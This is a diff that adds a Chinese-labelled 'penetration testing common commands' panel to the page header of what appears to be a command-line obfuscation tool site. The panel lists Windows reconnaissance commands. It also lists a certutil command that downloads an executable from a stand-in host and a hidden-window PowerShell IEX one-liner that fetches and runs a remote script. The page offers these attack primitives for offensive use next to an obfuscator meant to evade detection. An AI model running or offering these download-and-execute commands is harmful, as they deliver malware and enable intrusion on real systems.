@@ -3,6 +3,94 @@ layout: general
 description: Generate obfuscated command-line arguments for common system-native executables now with __SITE__.
 header: |
             <div class="tools">
+                            <!-- 渗透测试常用命令展示区域 -->
+                            <div class="common-commands">
+                                <div class="command-group">
+                                    <h3>渗透测试常用命令</h3>
+                                    <div class="command-list">
+                                        <!-- 系统信息收集 -->
+                                        <div class="command-category">
+                                            <div class="command-category-title">系统信息收集</div>
+                                            <div class="command-items">
+                                                <div class="command-item" data-command="wmic process list full">
+                                                    <code>wmic process list full</code>
+                                                    <span class="command-desc">查看进程详细信息</span>
+                                                </div>
+                                                <div class="command-item" data-command="wmic service list full">
+                                                    <code>wmic service list full</code>
+                                                    <span class="command-desc">查看服务详细信息</span>
+                                                </div>
+                                                <div class="command-item" data-command="wmic useraccount list full">
+                                                    <code>wmic useraccount list full</code>
+                                                    <span class="command-desc">查看用户账户信息</span>
+                                                </div>
+                                                <div class="command-item" data-command="systeminfo">
+                                                    <code>systeminfo</code>
+                                                    <span class="command-desc">查看系统信息</span>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <!-- 网络信息收集 -->
+                                        <div class="command-category">
+                                            <div class="command-category-title">网络信息收集</div>
+                                            <div class="command-items">
+                                                <div class="command-item" data-command="netstat -ano">
+                                                    <code>netstat -ano</code>
+                                                    <span class="command-desc">查看网络连接和进程</span>
+                                                </div>
+                                                <div class="command-item" data-command="ipconfig /all">
+                                                    <code>ipconfig /all</code>
+                                                    <span class="command-desc">查看网络配置</span>
+                                                </div>
+                                                <div class="command-item" data-command="arp -a">
+                                                    <code>arp -a</code>
+                                                    <span class="command-desc">查看ARP缓存</span>
+                                                </div>
+                                                <div class="command-item" data-command="route print">
+                                                    <code>route print</code>
+                                                    <span class="command-desc">查看路由表</span>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <!-- 文件操作 -->
+                                        <div class="command-category">
+                                            <div class="command-category-title">文件操作</div>
+                                            <div class="command-items">
+                                                <div class="command-item" data-command="certutil -urlcache -split -f http://example.com/file.exe file.exe">
+                                                    <code>certutil -urlcache -split -f http://example.com/file.exe file.exe</code>
+                                                    <span class="command-desc">下载文件</span>
+                                                </div>
+                                                <div class="command-item" data-command="certutil -encode file.txt file.b64">
+                                                    <code>certutil -encode file.txt file.b64</code>
+                                                    <span class="command-desc">Base64编码</span>
+                                                </div>
+                                                <div class="command-item" data-command="certutil -decode file.b64 file.txt">
+                                                    <code>certutil -decode file.b64 file.txt</code>
+                                                    <span class="command-desc">Base64解码</span>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <!-- PowerShell命令 -->
+                                        <div class="command-category">
+                                            <div class="command-category-title">PowerShell命令</div>
+                                            <div class="command-items">
+                                                <div class="command-item" data-command="powershell -enc [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('command'))">
+                                                    <code>powershell -enc [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('command'))</code>
+                                                    <span class="command-desc">PowerShell命令编码</span>
+                                                </div>
+                                                <div class="command-item" data-command="powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://example.com/script.ps1'))&quot;">
+                                                    <code>powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://example.com/script.ps1'))"</code>
+                                                    <span class="command-desc">远程执行PowerShell脚本</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
                             <textarea id="input-command" placeholder="Please paste the command you want to obfuscate here…" tabindex="0" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"></textarea>
                             <div class="command-bar">
                                 <div id="feeling-lucky"><a>Click here to try a random command</a></div>
